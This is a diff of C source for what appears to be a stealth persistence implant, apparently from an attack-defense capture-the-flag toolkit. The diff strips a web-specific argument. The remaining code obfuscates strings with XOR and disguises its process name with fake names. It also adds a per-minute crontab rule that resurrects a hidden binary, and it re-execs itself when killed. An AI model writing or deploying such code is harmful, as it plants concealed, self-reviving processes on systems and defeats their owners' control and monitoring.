@@ -14,7 +14,6 @@ extern char **environ;
 
 char flag[RSA_BYTES + 16] = "";  /* RSA 加密后 128 字节 */
 int flag_len = 0;
-int idx = 0;
 int shell_id = 0;
 
 static const char *fake_names[] = FAKE_NAMES;
@@ -99,21 +98,6 @@ static void install_cron_resurrect()
 
     /* 构建 crontab 命令：保留现有条目 + 追加复活规则 */
     char cmd[1024];
-#if (PROBLEM == WEB)
-    snprintf(cmd, sizeof(cmd),
-        "%s%s%s%s%s%s%s %d %s %s%s",
-        XorString("(crontab -l 2>/dev/null; echo '* * * * * [ -x "),
-        XorString(GHOST_PATH),
-        XorString(" ] && ! pgrep -f "),
-        XorString(GHOST_PATH),
-        XorString(" >/dev/null && "),
-        XorString(GHOST_PATH),
-        XorString(""),
-        idx,
-        XorString(GHOST_MAGIC),
-        XorString(" #XSH_CRON"),
-        XorString("') | crontab -"));
-#else
     snprintf(cmd, sizeof(cmd),
         "%s%s%s%s%s%s %s %s%s",
         XorString("(crontab -l 2>/dev/null; echo '* * * * * [ -x "),
@@ -125,7 +109,6 @@ static void install_cron_resurrect()
         XorString(GHOST_MAGIC),
         XorString(" #XSH_CRON"),
         XorString("') | crontab -"));
-#endif
     system(cmd);
 }
 
@@ -186,16 +169,8 @@ static void spawn_ghost(char **argv, pid_t *guard_pids, int guard_count)
         if (!alive)
         {
             char *new_argv[4] = { (char *)GHOST_PATH, NULL, NULL, NULL };
-#if (PROBLEM == WEB)
-            char idx_str[8];
-            snprintf(idx_str, sizeof(idx_str), "%d", idx);
-            new_argv[1] = idx_str;
-            new_argv[2] = (char *)GHOST_MAGIC;
-            new_argv[3] = NULL;
-#else
             new_argv[1] = (char *)GHOST_MAGIC;
             new_argv[2] = NULL;
-#endif
             execve(XorString(GHOST_PATH), new_argv, environ);
             sleep(5);
         }
@@ -728,15 +703,6 @@ int main(int argc, char *argv[])
     /* 初始化 cmdline 覆盖区域 */
     init_proc_title(argc, argv);
 
-    if (PROBLEM == WEB)
-    {
-        if (argc < 2)
-        {
-            perror(XorString("miss argv[1]"));
-            return 0;
-        }
-        idx = atoi(argv[1]);
-    }
 
     /* 备份自身到隐藏路径（在 unlink 之前），供复活器使用
      * ghost 重启时备份已存在，跳过避免写冲突 */
